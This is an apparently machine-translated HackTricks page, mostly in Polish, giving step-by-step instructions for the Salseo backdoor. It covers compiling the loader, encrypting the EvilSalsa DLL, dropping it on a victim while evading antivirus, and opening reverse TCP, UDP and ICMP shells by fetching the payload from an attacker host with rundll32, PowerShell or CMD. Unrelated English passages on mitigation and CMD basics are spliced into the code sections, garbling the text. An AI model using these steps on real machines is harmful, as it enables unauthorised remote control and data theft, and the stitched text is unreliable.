# Salseo

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Kompilowanie plików binarnych

Pobierz kod źródłowy z githuba i skompiluj **EvilSalsa** i **SalseoLoader**. Będziesz potrzebować zainstalowanego **Visual Studio**, aby skompilować kod.

Skompiluj te projekty dla architektury systemu Windows, na którym zamierzasz ich używać (jeśli system Windows obsługuje x64, skompiluj je dla tej architektury).

Możesz **wybrać architekturę** wewnątrz programu Visual Studio w **zakładce "Build"** w **"Platform Target".**

(\*\*Jeśli nie możesz znaleźć tych opcji, kliknij w **"Project Tab"**, a następnie w **"\<Project Name> Properties"**)

![](<../.gitbook/assets/image (132).png>)

Następnie skompiluj oba projekty (Build -> Build Solution) (W logach pojawi się ścieżka do pliku wykonywalnego):

![](<../.gitbook/assets/image (1) (2) (1) (1) (1).png>)

## Przygotuj backdoor

Przede wszystkim będziesz musiał zakodować **EvilSalsa.dll**. Możesz to zrobić za pomocą skryptu pythonowego **encrypterassembly.py** lub skompilować projekt **EncrypterAssembly**:

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows

#### Salseo

Salseo is a backdoor that allows remote access to a compromised Windows system. It is commonly used by attackers to maintain persistence and control over the compromised system.

##### Features

- **Remote Access**: Salseo provides remote access to the compromised system, allowing attackers to execute commands and interact with the system.
- **Persistence**: Salseo is designed to maintain persistence on the compromised system, ensuring that the backdoor remains active even after system reboots.
- **Stealth**: Salseo is capable of hiding its presence on the compromised system, making it difficult to detect and remove.
- **Command Execution**: Salseo allows attackers to execute commands on the compromised system, giving them full control over the system.
- **File Transfer**: Salseo enables attackers to transfer files to and from the compromised system, facilitating data exfiltration or the delivery of additional malware.

##### Indicators of Compromise

- **Unusual Network Traffic**: Salseo may generate unusual network traffic, such as connections to suspicious IP addresses or unusual communication patterns.
- **Unexpected System Behavior**: Salseo may cause unexpected system behavior, such as slow performance, crashes, or the appearance of new files or processes.
- **Unauthorized Access**: Salseo allows attackers to gain unauthorized access to the compromised system, which may be indicated by the presence of new user accounts or unusual login activity.
- **Persistence Mechanisms**: Salseo may create persistence mechanisms on the compromised system, such as registry keys or scheduled tasks, to ensure its continued operation.

##### Mitigation

To mitigate the risk of Salseo and similar backdoors:

- **Keep Systems Updated**: Regularly apply security patches and updates to ensure that known vulnerabilities are patched.
- **Use Strong Authentication**: Enforce the use of strong passwords and multi-factor authentication to prevent unauthorized access.
- **Monitor Network Traffic**: Implement network monitoring tools to detect and analyze unusual network traffic patterns.
- **Use Endpoint Protection**: Deploy endpoint protection solutions that can detect and block known backdoors and malware.
- **Educate Users**: Train users to recognize and report suspicious emails, links, and attachments to prevent initial compromise.

By following these mitigation measures, organizations can reduce the risk of Salseo and enhance the security of their Windows systems.
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
Ok, teraz masz wszystko, czego potrzebujesz, aby wykonać całą sprawę Salseo: **zakodowany EvilDalsa.dll** i **binarny plik SalseoLoader.**

**Prześlij binarny plik SalseoLoader.exe na maszynę. Nie powinny być wykrywane przez żadne oprogramowanie antywirusowe...**

## **Wykonaj backdoor**

### **Uzyskanie odwróconego powłoki TCP (pobieranie zakodowanego dll przez HTTP)**

Pamiętaj, aby uruchomić nc jako nasłuchiwacz odwróconej powłoki i serwer HTTP do obsługi zakodowanego evilsalsa.
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **Uzyskiwanie odwróconego powłoki UDP (pobieranie zakodowanego pliku DLL przez SMB)**

Pamiętaj, aby uruchomić nc jako nasłuchiwacz odwróconej powłoki oraz serwer SMB do udostępniania zakodowanego pliku evilsalsa (impacket-smbserver).
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **Uzyskiwanie odwróconej powłoki ICMP (zakodowany plik DLL już w ofierze)**

**Tym razem potrzebujesz specjalnego narzędzia w kliencie, aby odebrać odwróconą powłokę. Pobierz:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **Wyłączanie odpowiedzi ICMP:**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### Uruchomienie klienta:

```bash
./client
```

Uruchomienie klienta polega na wykonaniu polecenia powyżej.
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### Wewnątrz ofiary, wykonajmy rzecz zwaną salseo:
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## Kompilowanie SalseoLoader jako DLL eksportujący funkcję główną

Otwórz projekt SalseoLoader za pomocą programu Visual Studio.

### Dodaj przed funkcją główną: \[DllExport]

![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

### Zainstaluj DllExport dla tego projektu

#### **Narzędzia** --> **Menadżer pakietów NuGet** --> **Zarządzaj pakietami NuGet dla rozwiązania...**

![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

#### **Wyszukaj pakiet DllExport (używając zakładki Przeglądaj) i kliknij Zainstaluj (a następnie zaakceptuj wyskakujące okienko)**

![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1).png>)

W folderze projektu pojawiły się pliki: **DllExport.bat** i **DllExport\_Configure.bat**

### **Odinstaluj DllExport**

Kliknij **Odinstaluj** (tak, to dziwne, ale zaufaj mi, to konieczne)

![](<../.gitbook/assets/image (5) (1) (1) (2) (1).png>)

### **Zamknij Visual Studio i uruchom DllExport\_configure**

Po prostu **zamknij** Visual Studio

Następnie przejdź do folderu **SalseoLoader** i **uruchom DllExport\_Configure.bat**

Wybierz **x64** (jeśli zamierzasz go używać wewnątrz systemu x64, tak było w moim przypadku), wybierz **System.Runtime.InteropServices** (wewnątrz **Przestrzeń nazw dla DllExport**) i kliknij **Zastosuj**

![](<../.gitbook/assets/image (7) (1) (1) (1) (1).png>)

### **Otwórz projekt ponownie w programie Visual Studio**

**\[DllExport]** nie powinno już być oznaczone jako błąd

![](<../.gitbook/assets/image (8) (1).png>)

### Zbuduj rozwiązanie

Wybierz **Typ wyjściowy = Biblioteka klas** (Projekt --> Właściwości SalseoLoader --> Aplikacja --> Typ wyjściowy = Biblioteka klas)

![](<../.gitbook/assets/image (10) (1).png>)

Wybierz **platformę x64** (Projekt --> Właściwości SalseoLoader --> Kompilacja --> Platforma docelowa = x64)

![](<../.gitbook/assets/image (9) (1) (1).png>)

Aby **zbudować** rozwiązanie: Build --> Build Solution (W konsoli wyjściowej pojawi się ścieżka nowej DLL)

### Przetestuj wygenerowaną DLL

Skopiuj i wklej DLL tam, gdzie chcesz ją przetestować.

Wykonaj:
```
rundll32.exe SalseoLoader.dll,main
```
Jeśli nie pojawi się żadny błąd, prawdopodobnie masz działającą DLL!!

## Uzyskaj powłokę za pomocą DLL

Nie zapomnij użyć **serwera** **HTTP** i ustawić **nasłuchiwania nc**

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD

CMD (Command Prompt) is a command-line interpreter in Windows operating systems. It allows users to interact with the operating system by executing commands. CMD provides a wide range of commands that can be used to perform various tasks, such as managing files and directories, running programs, configuring system settings, and more.

CMD is often used by hackers as a tool for executing commands and carrying out various hacking activities. It provides a convenient way to navigate through the file system, access and modify files, and execute scripts or programs. Hackers can leverage CMD to exploit vulnerabilities, gain unauthorized access to systems, and perform other malicious activities.

When using CMD for hacking purposes, it is important to have a good understanding of the available commands and their functionalities. Some commonly used CMD commands in hacking include:

- **netstat**: Used to display active network connections, listening ports, and related network statistics. Hackers can use this command to identify open ports, detect network services, and gather information about potential targets.

- **ipconfig**: Used to display the IP configuration of a system, including the IP address, subnet mask, and default gateway. Hackers can use this command to gather information about the network configuration of a target system.

- **tasklist**: Used to display a list of running processes on a system. Hackers can use this command to identify running processes, their associated PIDs (Process IDs), and other relevant information.

- **regedit**: Used to access and modify the Windows Registry, which stores configuration settings and other important system information. Hackers can use this command to make changes to the registry, such as disabling security features or adding malicious entries.

- **ping**: Used to send ICMP Echo Request messages to a target IP address or hostname. Hackers can use this command to check the availability of a target system, measure network latency, and perform reconnaissance.

These are just a few examples of the many CMD commands that can be used for hacking purposes. It is important to note that using CMD for hacking activities without proper authorization is illegal and unethical.
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.

</details>
